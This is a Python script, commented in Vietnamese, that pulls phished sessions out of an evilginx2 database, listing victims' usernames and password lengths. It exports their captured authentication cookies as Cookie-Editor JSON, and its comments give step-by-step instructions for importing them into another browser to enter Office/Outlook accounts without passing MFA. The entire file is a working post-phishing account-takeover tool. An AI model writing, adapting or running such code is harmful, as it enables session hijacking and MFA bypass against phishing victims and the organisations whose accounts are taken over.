#!/usr/bin/env python3
# export_session_cookies.py — xuất session cookies của evilginx2 ra JSON chuẩn Cookie-Editor
# để import lên trình duyệt khác (tái sử dụng phiên đã xác thực MFA).
#
# Usage (trên VPS):
#   python3 export_session_cookies.py <session_id> [out.json]
#   python3 export_session_cookies.py list
#
# Cookie-Editor import: mở https://login.<basedomain> trên trình duyệt đích
# -> Cookie-Editor -> Import -> dán JSON -> mở office/outlook -> đã đăng nhập.
import json
import sqlite3
import sys
import time

DB = "/home/ubuntu/.evilginx/data.db"


def main():
    if len(sys.argv) < 2:
        print("usage: export_session_cookies.py list | <session_id> [out.json]")
        sys.exit(1)

    con = sqlite3.connect(DB)
    con.row_factory = sqlite3.Row

    if sys.argv[1] == "list":
        for r in con.execute(
            "select id, username, password, update_time from sessions order by id desc limit 10"
        ):
            created = time.strftime("%Y-%m-%d %H:%M", time.gmtime(r[3]))
            print(f"#{r[0]} | user: {r[1] or '-'} | pass_len: {len(r[2] or '')} | updated: {created}")
        return

    sid = int(sys.argv[1])
    out_path = sys.argv[2] if len(sys.argv) > 2 else f"session-{sid}-cookies.json"

    r = con.execute(
        "select id, username, cookie_tokens from sessions where id = ?", (sid,)
    ).fetchone()
    if not r:
        print(f"session {sid} not found")
        sys.exit(1)

    sid_num, user, ct_json = r
    tokens = json.loads(ct_json or "{}")

    editor_cookies = []
    exp = int(time.time()) + 90 * 86400  # 90 ngày
    for domain, cookies in tokens.items():
        for name, tok in cookies.items():
            value = tok.get("Value") or tok.get("value") or ""
            if not value:
                continue
            editor_cookies.append(
                {
                    "domain": domain,
                    "expirationDate": exp,
                    "hostOnly": not domain.startswith("."),
                    "httpOnly": bool(tok.get("HttpOnly", tok.get("http_only", False))),
                    "name": name,
                    "path": tok.get("Path", tok.get("path", "/")),
                    "sameSite": "no_restriction",
                    "secure": True,
                    "session": False,
                    "storeId": None,
                    "value": value,
                }
            )

    with open(out_path, "w") as f:
        json.dump(editor_cookies, f, indent=2)
    print(f"exported {len(editor_cookies)} cookies -> {out_path}")
    print(f"user: {user}")
    print("Import: Cookie-Editor extension -> Import -> chon file JSON nay")
    print("(import tren trang thuoc cung domain cua cac cookie — login.<basedomain> ...)")


if __name__ == "__main__":
    main()
